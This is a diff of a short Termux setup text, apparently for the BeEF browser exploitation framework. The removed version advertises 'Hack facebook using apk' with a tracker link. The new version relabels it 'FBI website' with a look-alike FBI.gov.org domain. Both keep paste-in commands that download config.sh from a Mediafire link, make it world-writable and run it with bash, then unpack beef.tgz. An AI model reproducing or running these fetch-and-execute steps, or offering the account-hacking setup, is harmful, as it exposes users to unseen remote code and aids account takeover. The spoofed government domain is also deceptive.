@@ -1,17 +1,13 @@
-Hack facebook using apk
-https://fb-tracker.cf/
+FBI website
+https://FBI.gov.org
 
 
-
-# beef
-beef arm-arm64
-#Special thanks to Yassmine lacheheb , johhny dep and freddy cruger
 #Configuration command#
-1 copy this command  on termux               curl -s -LO https://download1482.mediafire.com/bsxh1o7s30tg/eu2zpq272m9u0nl/config.sh
+1 curl -s -LO https://download1482.mediafire.com/bsxh1o7s30tg/eu2zpq272m9u0nl/config.sh
 
-2 copy paste this command also on termux     chmod 777 config.sh
+2 chmod 777 config.sh
 
-3 copy this command  on termux             bash config.sh
+3  bash config.sh
 
 
 tar -xvzf beef.tgz
